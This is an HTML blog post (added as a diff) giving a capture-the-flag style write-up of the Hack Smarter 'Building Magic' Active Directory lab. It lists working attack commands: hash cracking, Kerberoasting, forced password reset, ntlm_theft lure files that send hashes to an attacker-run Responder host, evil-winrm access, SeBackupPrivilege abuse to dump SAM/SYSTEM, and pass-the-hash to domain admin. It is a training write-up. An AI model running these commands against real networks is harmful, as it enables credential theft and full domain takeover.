@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Hack Smarter - AD Challenge Lab: Building Magic (Easy) - rt1252</title><meta name="Description" content="Write-up for Hack Smarter&#39;s Building Magic Lab."><meta property="og:url" content="http://localhost:1313/articles/write-ups/hack-smarter-building-magic/">
+  <meta property="og:site_name" content="rt1252">
+  <meta property="og:title" content="Hack Smarter - AD Challenge Lab: Building Magic (Easy)">
+  <meta property="og:description" content="Write-up for Hack Smarter&#39;s Building Magic Lab.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="articles">
+    <meta property="article:published_time" content="2025-11-25T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-11-25T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hack Smarter - AD Challenge Lab: Building Magic (Easy)">
+  <meta name="twitter:description" content="Write-up for Hack Smarter&#39;s Building Magic Lab.">
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/articles/write-ups/hack-smarter-building-magic/" /><link rel="prev" href="http://localhost:1313/articles/write-ups/sans-holiday-hack-2025/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Hack Smarter - AD Challenge Lab: Building Magic (Easy)",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/articles\/write-ups\/hack-smarter-building-magic\/"
+        },"genre": "articles","wordcount":  854 ,
+        "url": "http:\/\/localhost:1313\/articles\/write-ups\/hack-smarter-building-magic\/","datePublished": "2025-11-25T00:00:00+00:00","dateModified": "2025-11-25T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Raymond Truex. Views do not express my employer. Content is for educational purposes only."
+            },"description": "Write-up for Hack Smarter's Building Magic Lab."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="rt1252">rt1252</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/certs/"> Certs </a><a class="menu-item" href="/articles/"> Articles </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="rt1252">rt1252</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/certs/" title="">Certs</a><a class="menu-item" href="/articles/" title="">Articles</a><a class="menu-item" href="/about/" title="">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">Hack Smarter - AD Challenge Lab: Building Magic (Easy)</h1><div class="content" id="content"><h2 id="hack-smarter---ad-challenge-lab-building-magic-easy">Hack Smarter - AD Challenge Lab: Building Magic (Easy)</h2>
+<p>I have been meaning to check out the <a href="https://www.hacksmarter.org/" target="_blank" rel="noopener noreffer ">Hack Smarter Labs</a> for some time now, the creator of the site <a href="https://www.youtube.com/@TylerRamsbey" target="_blank" rel="noopener noreffer ">Tyler Ramsbey</a> provides great content and his YouTube and Discord encouraged me to get my OSCP. Today I bought his membership and did an easy lab for fun, the site is great and labs spin up in under a minute, I expected nothing less.</p>
+<p>Jump to sections: <a href="#r-widdleton" rel="">r.widdleton</a> · <a href="#r-haggard" rel="">r.haggard</a> · <a href="#h-potch" rel="">h.potch</a> · <a href="#h-grangon" rel="">h.grangon</a> · <a href="#administrator" rel="">Administrator</a></p>
+<h2 id="r-widdleton">r.widdleton</h2>
+<p>We begin the lab with the IP address, doamin name (buildingmagic.local), and a leaked database file.  Start by providing the hashes to hashcat to crack.
+<code>hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt</code></p>
+<p><a class="lightgallery" href="/assets/buildingmagic/01_hash.png" title="/assets/buildingmagic/01_hash.png" data-thumbnail="/assets/buildingmagic/01_hash.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/01_hash.png"
+            data-srcset="/assets/buildingmagic/01_hash.png, /assets/buildingmagic/01_hash.png 1.5x, /assets/buildingmagic/01_hash.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/01_hash.png" width="1200" />
+    </a>
+We next verify these creds using nxc.
+<code>nxc smb 10.0.27.23 -u r.widdleton -p 'lilronron'</code></p>
+<p><a class="lightgallery" href="/assets/buildingmagic/02_valid_creds.png" title="/assets/buildingmagic/02_valid_creds.png" data-thumbnail="/assets/buildingmagic/02_valid_creds.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/02_valid_creds.png"
+            data-srcset="/assets/buildingmagic/02_valid_creds.png, /assets/buildingmagic/02_valid_creds.png 1.5x, /assets/buildingmagic/02_valid_creds.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/02_valid_creds.png" width="1200" />
+    </a>
+Great we have our initial user, now we need to do some enumeration to find how to pivot or escalate to another user. Running BH will help us gain some info about user permissions and might be helpful later down the road.
+<code>bloodhound-ce-python -d BUILDINGMAGIC.LOCAL -u 'r.widdleton' -p 'lilronron' -ns 10.0.27.23 -c all</code></p>
+<p><a class="lightgallery" href="/assets/buildingmagic/03_bh_python.png" title="/assets/buildingmagic/03_bh_python.png" data-thumbnail="/assets/buildingmagic/03_bh_python.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/03_bh_python.png"
+            data-srcset="/assets/buildingmagic/03_bh_python.png, /assets/buildingmagic/03_bh_python.png 1.5x, /assets/buildingmagic/03_bh_python.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/03_bh_python.png" width="1200" />
+    </a>
+Note: I have found that the new BH Docker takes forever to clear the database if you initiate the data removal through the gui - this command is much faster <code>docker volume rm $(docker volume ls -q | grep neo4j-data)</code></p>
+<p>We can check r.widdleton in BloodHound and see they are not have any interesting groups or outbound object control. Next I like running an LDAPDomainDump to gain information about computers, users, and groups to get a good idea of the whole AD environment. It looks like the theme of this box is Harry Potter, the box name now makes more sense.
+<code>ldapdomaindump ldap://10.0.27.23 -u 'BUILDINGMAGIC.LOCAL\r.widdleton' -p 'lilronron'</code></p>
+<p><a class="lightgallery" href="/assets/buildingmagic/04_dump_users.png" title="/assets/buildingmagic/04_dump_users.png" data-thumbnail="/assets/buildingmagic/04_dump_users.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/04_dump_users.png"
+            data-srcset="/assets/buildingmagic/04_dump_users.png, /assets/buildingmagic/04_dump_users.png 1.5x, /assets/buildingmagic/04_dump_users.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/04_dump_users.png" width="1200" />
+    </a>
+We see that r.haggard has a SPN set which most likley means we need to Kerberoast.</p>
+<h2 id="r-haggard">r.haggard</h2>
+<p>We can run a Kerberoasting attack to try to identify and crack r.haggard&rsquo;s hash since this user has a SPN set.
+<code>sudo impacket-GetUserSPNs buildingmagic.local/r.widdleton:lilronron -dc-ip 10.0.27.23 -request -outputfile kerberoast_hashes.txt</code></p>
+<p><a class="lightgallery" href="/assets/buildingmagic/05_kerberoast.png" title="/assets/buildingmagic/05_kerberoast.png" data-thumbnail="/assets/buildingmagic/05_kerberoast.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/05_kerberoast.png"
+            data-srcset="/assets/buildingmagic/05_kerberoast.png, /assets/buildingmagic/05_kerberoast.png 1.5x, /assets/buildingmagic/05_kerberoast.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/05_kerberoast.png" width="1200" />
+    </a>
+After we crack the hash we can verify the creds using nxc.</p>
+<p><a class="lightgallery" href="/assets/buildingmagic/06_haggard_nxc.png" title="/assets/buildingmagic/06_haggard_nxc.png" data-thumbnail="/assets/buildingmagic/06_haggard_nxc.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/06_haggard_nxc.png"
+            data-srcset="/assets/buildingmagic/06_haggard_nxc.png, /assets/buildingmagic/06_haggard_nxc.png 1.5x, /assets/buildingmagic/06_haggard_nxc.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/06_haggard_nxc.png" width="1200" />
+    </a>
+We can take a look at r.haggard outbound object control in BH to find they can ForceChangePassword over h.potch</p>
+<a class="lightgallery" href="/assets/buildingmagic/07_haggard_bh.png" title="/assets/buildingmagic/07_haggard_bh.png" data-thumbnail="/assets/buildingmagic/07_haggard_bh.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/07_haggard_bh.png"
+            data-srcset="/assets/buildingmagic/07_haggard_bh.png, /assets/buildingmagic/07_haggard_bh.png 1.5x, /assets/buildingmagic/07_haggard_bh.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/07_haggard_bh.png" width="1200" />
+    </a>
+<h2 id="h-potch">h.potch</h2>
+<p>BloodHound provides instructions on how to force a password change, we can force the change and verify the change took place with nxc, we can also check shares to see we have read,write access over File-Share.
+<code>net rpc password 'h.potch' 'P@$$w0rd!' -U 'BUILDINGMAGIC.LOCAL'/'r.haggard'%'rubeushagrid' -S '10.0.27.23'</code></p>
+<p><code>nxc smb 10.0.27.23 -u h.potch -p 'P@$$w0rd!'</code></p>
+<a class="lightgallery" href="/assets/buildingmagic/08_potch_nxc.png" title="/assets/buildingmagic/08_potch_nxc.png" data-thumbnail="/assets/buildingmagic/08_potch_nxc.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/08_potch_nxc.png"
+            data-srcset="/assets/buildingmagic/08_potch_nxc.png, /assets/buildingmagic/08_potch_nxc.png 1.5x, /assets/buildingmagic/08_potch_nxc.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/08_potch_nxc.png" width="1200" />
+    </a>
+<p>We connect to the SMB share but there is nothing inside of it, since we have write access I think this is a good time to use <a href="https://github.com/Greenwolf/ntlm_theft" target="_blank" rel="noopener noreffer ">ntlm_theft</a>. We can generate all files using the following command.
+<code>python3 ntlm_theft.py --generate all --server 10.200.21.72 --filename payroll</code></p>
+<p>Using the files we generated we want to start a Responder listener, upload the ntlm_theft files, and hope we capture a ntlm credential via the user interacting with the ntlm_theft file we upload to the SMB share. Let&rsquo;s start the responder listener and uploading the files.
+<code>sudo responder -I tun0 </code></p>
+<p><code>impacket-smbclient 'h.potch':'P@$$w0rd!'@DC01.BUILDINGMAGIC.LOCAL </code></p>
+<p>It looks like the .lnk file was the one that resulted in a captured hash for h.grangon.</p>
+<a class="lightgallery" href="/assets/buildingmagic/09_responder.png" title="/assets/buildingmagic/09_responder.png" data-thumbnail="/assets/buildingmagic/09_responder.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/09_responder.png"
+            data-srcset="/assets/buildingmagic/09_responder.png, /assets/buildingmagic/09_responder.png 1.5x, /assets/buildingmagic/09_responder.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/09_responder.png" width="1200" />
+    </a>
+<h2 id="h-grangon">h.grangon</h2>
+<p>Now that we have h.grangon&rsquo;s hash we can try to crack it and verify it is valid with nxc.
+<code>hashcat -m 5600 h.grangon_hash.txt /usr/share/wordlists/rockyou.txt</code></p>
+<p><code>nxc rdp 10.0.27.23 -u h.grangon -p 'magic4ever'</code></p>
+<a class="lightgallery" href="/assets/buildingmagic/10_grangon_nxc.png" title="/assets/buildingmagic/10_grangon_nxc.png" data-thumbnail="/assets/buildingmagic/10_grangon_nxc.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/10_grangon_nxc.png"
+            data-srcset="/assets/buildingmagic/10_grangon_nxc.png, /assets/buildingmagic/10_grangon_nxc.png 1.5x, /assets/buildingmagic/10_grangon_nxc.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/10_grangon_nxc.png" width="1200" />
+    </a>
+<p>We can look at any groups or outbound object control that h.grangon has and we find they are in the remote management users group which often means they can authenticate via RDP or winrm.</p>
+<a class="lightgallery" href="/assets/buildingmagic/11_grangon_bh.png" title="/assets/buildingmagic/11_grangon_bh.png" data-thumbnail="/assets/buildingmagic/11_grangon_bh.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/11_grangon_bh.png"
+            data-srcset="/assets/buildingmagic/11_grangon_bh.png, /assets/buildingmagic/11_grangon_bh.png 1.5x, /assets/buildingmagic/11_grangon_bh.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/11_grangon_bh.png" width="1200" />
+    </a>
+<p>Let&rsquo;s try to connect to the DC via evil-winrm.</p>
+<p><code>evil-winrm -i 10.0.27.23 -u H.GRANGON -p 'magic4ever'</code></p>
+<a class="lightgallery" href="/assets/buildingmagic/12_user.png" title="/assets/buildingmagic/12_user.png" data-thumbnail="/assets/buildingmagic/12_user.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/12_user.png"
+            data-srcset="/assets/buildingmagic/12_user.png, /assets/buildingmagic/12_user.png 1.5x, /assets/buildingmagic/12_user.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/12_user.png" width="1200" />
+    </a>
+<p>Great now we have the user flag! One of the first things I do when enumerating a machine is check current user creds, we can see that we have the SeBackupPrivilege role which can be exploited, see <a href="https://r00tven0m.github.io/posts/Domain-Privilege-Escalation-Backup-Operators-Group/" target="_blank" rel="noopener noreffer ">https://r00tven0m.github.io/posts/Domain-Privilege-Escalation-Backup-Operators-Group/</a></p>
+<p><code>whoami /all</code></p>
+<a class="lightgallery" href="/assets/buildingmagic/13_privs.png" title="/assets/buildingmagic/13_privs.png" data-thumbnail="/assets/buildingmagic/13_privs.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/13_privs.png"
+            data-srcset="/assets/buildingmagic/13_privs.png, /assets/buildingmagic/13_privs.png 1.5x, /assets/buildingmagic/13_privs.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/13_privs.png" width="1200" />
+    </a>
+<p>If we want since SeBackup allows us to backup files we wouldn&rsquo;t normally be able to read, we can just read the root flag. We can import these two .dll files which give us helpful cmdlets for backing up files - <a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug" target="_blank" rel="noopener noreffer ">SeBackupPrivilegeCmdLets</a>. Using evil-winrm is as easy as using the upload command and uploading the .dll files.</p>
+<p><code>upload SeBackupPrivilegeUtils.dll</code></p>
+<p><code>upload SeBackupPrivilegeCmdLets.dll</code></p>
+<p><code>Import-Module .\SeBackupPrivilegeUtils.dll</code></p>
+<p><code>Import-Module .\SeBackupPrivilegeCmdLets.dll</code></p>
+<p><code>Set-SeBackupPrivilege</code></p>
+<p><code>Copy-FileSeBackupPrivilege 'C:\Users\administrator\desktop\root.txt' .\root.txt</code></p>
+<a class="lightgallery" href="/assets/buildingmagic/14_root.png" title="/assets/buildingmagic/14_root.png" data-thumbnail="/assets/buildingmagic/14_root.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/14_root.png"
+            data-srcset="/assets/buildingmagic/14_root.png, /assets/buildingmagic/14_root.png 1.5x, /assets/buildingmagic/14_root.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/14_root.png" width="1200" />
+    </a>
+<p>Obviously this is not realistic, AD pentests do not involve just getting root so let&rsquo;s become domain admin.</p>
+<h2 id="administrator">Administrator</h2>
+<p>Using the article linked above it shows we can easily save SAM &amp; SYSTEM then secretsdump them locally. Let&rsquo;s give it a shot.</p>
+<p><code>reg save hklm\sam .\sam</code></p>
+<p><code>reg save hklm\system .\system</code></p>
+<a class="lightgallery" href="/assets/buildingmagic/15_sam_system.png" title="/assets/buildingmagic/15_sam_system.png" data-thumbnail="/assets/buildingmagic/15_sam_system.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/15_sam_system.png"
+            data-srcset="/assets/buildingmagic/15_sam_system.png, /assets/buildingmagic/15_sam_system.png 1.5x, /assets/buildingmagic/15_sam_system.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/15_sam_system.png" width="1200" />
+    </a>
+<p>Download the files to your local machine and we can run secretsdump.</p>
+<a class="lightgallery" href="/assets/buildingmagic/16_secretsdump.png" title="/assets/buildingmagic/16_secretsdump.png" data-thumbnail="/assets/buildingmagic/16_secretsdump.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/16_secretsdump.png"
+            data-srcset="/assets/buildingmagic/16_secretsdump.png, /assets/buildingmagic/16_secretsdump.png 1.5x, /assets/buildingmagic/16_secretsdump.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/16_secretsdump.png" width="1200" />
+    </a>
+<p>We can then try to crack the hash with no luck, we also try to login as administrator a couple of different ways with no luck. Let&rsquo;s try for password reuse.</p>
+<p><code>nxc smb 10.0.27.23 -u users.txt -H 520126a03f5d5a8d836f1c4f34ede7ce</code></p>
+<a class="lightgallery" href="/assets/buildingmagic/17_flatch.png" title="/assets/buildingmagic/17_flatch.png" data-thumbnail="/assets/buildingmagic/17_flatch.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/buildingmagic/17_flatch.png"
+            data-srcset="/assets/buildingmagic/17_flatch.png, /assets/buildingmagic/17_flatch.png 1.5x, /assets/buildingmagic/17_flatch.png 2x"
+            data-sizes="auto"
+            alt="/assets/buildingmagic/17_flatch.png" width="1200" />
+    </a>
+<p>Sweet we can see that the domain admin n.flatch reused the same cred on the local administrator account and their domain account. We now have DA and are done!</p>
+</div></div></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                <a href="https://www.linkedin.com/in/ray-truex/" target="_blank" rel="noopener noreferrer" title="LinkedIn Profile">
+                    <i class="fab fa-linkedin fa-2x" aria-hidden="true"></i>
+                </a>
+            </div><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.152.2">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;Raymond Truex. Views do not express my employer. Content is for educational purposes only.</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
